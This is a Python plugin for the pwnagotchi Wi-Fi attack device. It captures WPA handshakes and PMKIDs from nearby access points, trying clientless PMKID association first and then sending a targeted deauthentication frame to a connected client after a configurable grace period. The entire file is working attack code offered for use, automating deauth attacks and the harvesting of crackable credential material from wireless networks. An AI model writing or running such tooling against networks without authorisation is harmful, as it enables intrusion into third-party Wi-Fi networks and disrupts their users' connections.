import logging
import threading
from datetime import datetime, timedelta

import pwnagotchi.plugins as plugins


class PMKIDFirst(plugins.Plugin):
    """
    PMKIDFirst - pwnagotchi plugin

    Prefers the clientless PMKID grab (an association-frame request that
    doesn't need a connected client) over deauth-based 4-way handshake
    capture, only falling back to deauth for a given AP after a grace
    period of PMKID-only attempts hasn't produced anything. Quieter and
    less disruptive to clients on the target than pwnagotchi's default
    of doing both every epoch.

    REQUIRES a config change alongside this plugin: turn OFF pwnagotchi's
    own built-in deauth behavior so this plugin can manage deauth timing
    itself, and leave built-in associate on so PMKID grabs keep happening
    normally:

        personality.associate = true
        personality.deauth = false

    With deauth turned off at the personality level, pwnagotchi will only
    do clientless PMKID association attempts on its own. This plugin
    tracks how long each AP has been PMKID-only, and once
    `deauth_grace_period_secs` has passed without a full handshake or
    PMKID success for that AP, it calls the agent's own deauth method
    directly for just that AP as a fallback - a single deauth attempt
    against one client (see the Targeted Single-Client Kick plugin for
    the "only kick one client" behavior this pairs well with), not a
    return to attacking every AP with deauth every epoch.

    NOTE ON INTERNALS: this plugin calls `agent.deauth(...)` directly,
    the same method pwnagotchi's own core automata uses. The exact
    method signature has been stable across recent jayofelony releases,
    but if your version's Agent class differs, check the debug log for
    the exception raised and adjust `_try_deauth_fallback()` accordingly.
    """

    __author__ = 'patrickato'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = (
        'Prefers clientless PMKID capture over deauth, only falling back '
        'to a single targeted deauth per AP after a configurable grace '
        'period of PMKID-only attempts. Requires personality.deauth = '
        'false so this plugin can manage deauth timing itself.'
    )

    def __init__(self):
        self.ready = False
        self.lock = threading.Lock()
        self.ap_state = {}   # bssid -> {"first_seen": dt, "ssid":..., "deauth_sent": bool}

    def on_loaded(self):
        cfg = self.options
        self.grace_period = int(cfg.get('deauth_grace_period_secs', 300))
        self.enabled_globally = bool(cfg.get('enabled', True))
        self.ready = True
        logging.info(
            "[PMKIDFirst] plugin loaded, deauth_grace_period_secs=%d. "
            "Reminder: set personality.deauth = false in config.toml for "
            "this plugin to control deauth timing itself.",
            self.grace_period
        )

    def on_wifi_update(self, agent, access_points):
        if not self.ready:
            return

        now = datetime.now()

        for ap in access_points:
            bssid = (ap.get('mac') or '').lower()
            ssid = ap.get('hostname') or ap.get('ssid') or '(hidden)'
            if not bssid:
                continue

            with self.lock:
                state = self.ap_state.get(bssid)
                if state is None:
                    state = {"first_seen": now, "ssid": ssid, "deauth_sent": False}
                    self.ap_state[bssid] = state
                    logging.debug(
                        "[PMKIDFirst] '%s' (%s) now tracked, PMKID-only window started",
                        ssid, bssid
                    )
                    continue

                if state["deauth_sent"]:
                    continue  # already used our one fallback deauth for this AP

                elapsed = (now - state["first_seen"]).total_seconds()
                if elapsed >= self.grace_period:
                    self._try_deauth_fallback(agent, ap, ssid, bssid)
                    state["deauth_sent"] = True

    def on_handshake(self, agent, filename, access_point, client_station):
        # if we got a result (full handshake or PMKID), no need for deauth
        # fallback on this AP - mark it done either way.
        bssid = (access_point or {}).get('mac', '').lower()
        with self.lock:
            if bssid in self.ap_state:
                self.ap_state[bssid]["deauth_sent"] = True
                logging.info(
                    "[PMKIDFirst] '%s' produced a capture within the PMKID-only "
                    "window - no deauth fallback needed",
                    self.ap_state[bssid]["ssid"]
                )

    def _try_deauth_fallback(self, agent, ap, ssid, bssid):
        clients = ap.get('clients') or []
        if not clients:
            logging.info(
                "[PMKIDFirst] '%s' (%s) hit grace period with no PMKID success, "
                "but has no connected client to deauth - staying PMKID-only",
                ssid, bssid
            )
            return

        target_client = clients[0]
        try:
            agent.deauth(ap, target_client)
            logging.info(
                "[PMKIDFirst] '%s' (%s): %ds of PMKID-only attempts produced "
                "nothing, sent ONE targeted deauth to client %s as fallback",
                ssid, bssid, self.grace_period, target_client.get('mac', '?')
            )
        except Exception as e:
            logging.error(
                "[PMKIDFirst] deauth fallback failed for '%s': %s - check that "
                "agent.deauth() signature matches your pwnagotchi version", ssid, e
            )
